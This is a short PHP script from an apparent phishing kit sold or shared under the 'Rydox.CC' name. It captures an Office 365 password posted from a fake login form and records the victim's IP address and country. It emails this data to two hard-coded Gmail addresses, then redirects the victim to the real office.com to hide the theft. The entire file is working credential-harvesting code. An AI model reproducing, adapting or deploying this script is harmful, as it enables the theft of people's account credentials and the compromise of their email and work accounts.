<?php
// Rydox.CC Coding.
// www.rydox.cc
// Telegram : @RydoxTm
// ICQ : @Rydox

$recipient = 'markhaydon48@gmail.com,johnsonlayton1@gmail.com'; // Put your email address herez
$over = 'https://www.office.com/';//website
if(isset($_POST['pass'])){

function visitor_country()
	{
		
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$country = json_decode(curl_exec($ch))->country;
	
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$country = visitor_country();

	$ip = getenv("REMOTE_ADDR");
	
    $message.= "Password: " . $_POST['pass'] . "\n";
	$message.= "Client IP      : $ip\n";
	$message.= "Client Country      : $country\n";
	$subject = "Office 365 | True Login: " . $ip . "\n";

	if (mail($recipient, $subject, $message))
		{
			header("Location: $over");
		}
	  else
		{
		header("Location: $over?error&id=$pass&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
		
		}
	}else{
        header("Location: index4.php");
	}
